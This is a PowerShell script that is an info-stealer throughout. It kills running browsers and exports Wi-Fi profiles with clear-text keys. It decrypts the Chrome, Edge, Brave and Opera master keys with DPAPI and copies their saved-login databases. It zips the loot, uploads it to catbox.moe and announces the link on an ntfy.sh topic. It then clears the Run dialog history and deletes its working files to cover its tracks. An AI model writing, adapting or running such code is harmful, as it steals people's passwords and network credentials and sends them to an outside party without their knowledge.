$ErrorActionPreference = 'Continue'
$topic = "data_stwealer_hideen_"
$log   = "$env:TEMP\StealerDebug_$(Get-Date -Format 'HHmmss').log"

function Log($msg) {
    $line = "$(Get-Date -Format 'HH:mm:ss') | $msg"
    $line | Out-File -Append -Encoding utf8 $log
    Write-Host $line
}

Log "=== START ==="

# Load required assemblies early
try {
    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    Log "Assemblies loaded"
} catch {
    Log "CRITICAL: Cannot load assemblies - $($_.Exception.Message)"
    exit 1
}

# Kill browsers (forcefully, wait, retry)
Log "Terminating browsers..."
@("chrome","msedge","brave","opera") | ForEach-Object {
    Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 4

# Workspace
$dir = "$env:TEMP\Cache_$(Get-Random -Minimum 10000 -Maximum 999999)"
$zip = "$env:TEMP\Pkg_$(Get-Random -Minimum 1000 -Maximum 9999).zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -EA SilentlyContinue }
New-Item -ItemType Directory $dir | Out-Null
Log "Workspace: $dir"

# WiFi profiles
Log "Exporting WiFi profiles..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# Browser targets
$browsers = @{
    Chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    Edge   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    Brave  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    Opera  = "$env:APPDATA\Opera Software\Opera Stable"
}

foreach ($name in $browsers.Keys) {
    $base = $browsers[$name]
    $localState = Join-Path $base "Local State"

    if (-not (Test-Path $localState)) { 
        Log "[$name] Local State not found"
        continue 
    }

    Log "[$name] Processing..."

    try {
        $json = Get-Content $localState -Raw -EA Stop | ConvertFrom-Json -EA Stop
        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        $keyBytes = $encKey[5..($encKey.Length-1)]
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, 'CurrentUser')
        $keyHex = [BitConverter]::ToString($masterKey) -replace '-'
        $keyHex | Out-File "$dir\$($name)_masterkey.txt" -Encoding ascii
        Log "[$name] Master key extracted"

        # Login Data path
        $profilePath = if ($name -eq "Opera") { $base } else { Join-Path $base "Default" }
        $dbPath = Join-Path $profilePath "Login Data"

        if (Test-Path $dbPath) {
            $dest = "$dir\$($name)_LoginData.db"
            Copy-Item $dbPath $dest -Force -EA Stop
            Log "[$name] Login Data copied → $dest"
        } else {
            Log "[$name] Login Data not found at $dbPath"
        }
    }
    catch {
        Log "[$name] ERROR: $($_.Exception.Message)"
    }
}

# Create zip
Log "Creating archive..."
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
$sizeMB = "{0:N2}" -f ((Get-Item $zip).Length / 1MB)
Log "Archive created: $zip ($sizeMB MB)"

# Upload with better capture
Log "Uploading..."
$curlArgs = @("-s", "-S", "-F", "reqtype=fileupload", "-F", "fileToUpload=@$zip", "https://catbox.moe/user/api.php")
$linkRaw = & curl.exe @curlArgs 2>&1
$link = ($linkRaw | Out-String).Trim()

Log "Raw curl output: $link"

if ($link -match '^https?://files\.catbox\.moe/') {
    Log "Upload OK → $link"
    try {
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "File: $link" -TimeoutSec 12
        Log "ntfy sent"
    } catch {
        Log "ntfy failed: $($_.Exception.Message)"
    }
} else {
    Log "Upload FAILED or invalid link"
}

# Cleanup
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -EA SilentlyContinue
Remove-Item -Recurse -Force $dir,$zip -EA SilentlyContinue

Log "=== FINISHED ==="
Start-Sleep -Seconds 8   # give time to read log before window closes (remove if unwanted)
